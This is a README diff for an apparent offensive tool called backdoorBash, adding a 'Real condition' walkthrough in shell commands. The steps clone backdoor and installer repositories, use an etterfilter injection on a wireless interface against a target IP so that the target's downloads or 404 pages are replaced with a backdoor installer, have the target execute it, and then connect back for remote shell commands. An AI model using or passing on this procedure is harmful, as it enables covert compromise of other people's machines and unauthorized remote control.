@@ -42,13 +42,29 @@ cd backdoorBash
 cp config.sh.sample config.sh 
 vim config.sh
 ./server.sh
-./client.sh
+HOST=192.168.0.x ./client.sh
 ```
 .... And try to execute some shell command
 
 ### Real condition
 
-_TODO_
+```bash
+git clone git@github.com:pilebones/backdoorBash.git
+git clone git@github.com:pilebones/etterfilterSamples.git
+git clone git@github.com:pilebones/hostingBackdoorInstaller.git
+cp backdoorBash/config.sh.sample backdoorBash/config.sh
+vim backdoorBash/config.sh
+# For export remove client.sh *.log config.sh.sample
+tar xvzf hostingBackdoorInstaller/export.tar.gz backdoorBash/
+# Configure your vhost to hosting hostingBackdoorInstaller's project
+cd etterfilterSamples/inject_backdoor_installer/
+# Update Redirect URL from "fake-http-redirect.txt"
+vim fake-http-redirect.txt
+IFACE=wlanX IP_AP=192.168.0.1 IP_TARGET=192.168.0.x ./run
+# From target try to download a shell script like "test.sh" or try with 404 Not Found page (same behavior => inject backdoor installer)
+# From target : "chmod +x bd_installer.sh && ./bd_installer.sh"
+HOST=192.168.0.x ./client.sh
+```
 
 ## Limitations
 
